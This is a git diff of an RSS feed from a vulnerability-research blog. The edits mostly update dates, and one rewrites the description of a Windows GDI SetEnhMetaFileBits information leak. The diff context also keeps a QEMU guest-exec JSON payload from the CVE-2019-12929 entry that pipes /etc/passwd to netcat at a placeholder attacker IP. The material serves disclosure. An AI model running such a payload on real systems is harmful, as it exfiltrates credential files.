@@ -5,15 +5,15 @@
     <description>A fan of sofware bugs and vulnerabilities.</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>2020-05-20</pubDate>
-    <lastBuildDate>Wed, 20 May 2020 19:08:28 +0000</lastBuildDate>
+    <pubDate>2020-05-21</pubDate>
+    <lastBuildDate>Thu, 21 May 2020 15:04:47 +0000</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
       <item>
         <title>Windows GDI SetEnhMetaFileBits - Out-of-Bounds Read</title>
         <description>&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 
-&lt;p&gt;One of my fuzzing harness triggered a crash in &lt;strong&gt;GDI32!SetEnhMetaFileBits&lt;/strong&gt; function when it tries to copy a user-controlled data to a local dynamically allocated memory space. The crash was analyzed to be a &lt;strong&gt;Read Access Violation&lt;/strong&gt; and marked as &lt;strong&gt;PROBABLY_NOT_EXPLOITABLE&lt;/strong&gt;. After doing a bit of debugging I found out that it could be leveraged into an &lt;strong&gt;Information Leakage&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;One of my fuzzing harness triggered a crash in &lt;strong&gt;GDI32!SetEnhMetaFileBits&lt;/strong&gt; function which turned out to be a vulnerability. The crash happens when it tries to copy a user-controlled data to a local dynamically allocated memory space. However due to the lack of memory initialization, the allocated buffer is left unfilled and allows the attacker to exploit this vulnerability to achieve &lt;strong&gt;Information Leakage&lt;/strong&gt;.&lt;/p&gt;
 
 &lt;h1 id=&quot;crash-analysis&quot;&gt;Crash Analysis&lt;/h1&gt;
 
@@ -102,7 +102,8 @@ GDI32!SetEnhMetaFileBits:
 00d2f7a0  33b18477 00d2f7ec 77d79e54 7eb77000
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;We can confirm with the disassembly code below that our tainted input will go down to this path.&lt;/p&gt;
+&lt;p&gt;We can confirm with the disassembly code below that there is no initialization to the allocated memory.&lt;/p&gt;
+
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:0000000180040089                 test    r13b, 1
 .text:000000018004008D                 jnz     loc_18004019F
 .text:0000000180040093                 mov     edx, [rsi+30h]  ; uBytes
@@ -121,7 +122,7 @@ GDI32!SetEnhMetaFileBits:
 .text:00000001800400C5                 mov     [rbx+38h], rcx
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;With a little bit of modification to the harness. It is now pointing to a buffer someplace where the user can control and if the buffer is crafted correctly according to its data structure the &lt;strong&gt;GDI32!pmfAllocMF&lt;/strong&gt; will end up using part of the buffer as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntdll!memcpy&lt;/code&gt; length. So from there we can find a way to achieve info-leak but it is trivial so I will leave it as an exercise to the readers :).&lt;/p&gt;
+&lt;p&gt;With a little bit of modification to the harness. The user can control the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Size&lt;/code&gt; passed to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntdll!memcpy&lt;/code&gt; and thus control how much bytes to be leaked. So from here we can find a way to leak the uninitialized data but it is trivial so I will leave it as an exercise to the readers :). Here is how it looks like once everything is set in the right way. Have fun!&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eax=00000000 ebx=00fd8fe8 ecx=00000001 edx=00fd8808 esi=77527e70 edi=800fdf70
 eip=775283c0 esp=00d7f7fc ebp=00d7f814 iopl=0         nv up ei pl zr na pe nc
@@ -159,7 +160,7 @@ ntdll!memcpy+0x213:
 08 00d7f8c8 00000000 009c1353 7f1c5000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</guid>
         
@@ -208,7 +209,7 @@ ntdll!memcpy+0x213:
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</guid>
         
@@ -276,7 +277,7 @@ ntdll!memcpy+0x213:
 
 &lt;p&gt;Going down the rabbit hole right before the data is insert into the hash table through &lt;strong&gt;emu_hashtable_insert&lt;/strong&gt; at line 70. &lt;strong&gt;emu_hashtable_search&lt;/strong&gt; is called to check whether the data is already inserted or not. At line 96, the address of the key inside the hash table will be divided with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eh-&amp;gt;size&lt;/code&gt; and triggers the bug.&lt;/p&gt;
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2020-03/libemu_divide_by_zero</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-03/libemu_divide_by_zero</guid>
         
@@ -397,7 +398,7 @@ diff --git a/mo&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dules&lt;/span&gt;&l
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</guid>
         
@@ -498,7 +499,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</guid>
         
@@ -553,7 +554,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;corrupt stack?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13614</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13614</guid>
         
@@ -618,7 +619,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13613</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13613</guid>
         
@@ -1992,7 +1993,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2019-06/bhyve_hda_bof</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/bhyve_hda_bof</guid>
         
@@ -2015,7 +2016,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'execute':'guest-exec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arguments':&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'path':'/bin/bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arg':&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'-c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'cat&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/etc/passwd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;attacker_ip&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9999&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2019-06/CVE-2019-12929</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/CVE-2019-12929</guid>
         
@@ -2043,7 +2044,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;return&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-05-20</pubDate>
+        <pubDate>2020-05-21</pubDate>
         <link>http://localhost:4000/articles/2019-06/CVE-2019-12928</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/CVE-2019-12928</guid>
         
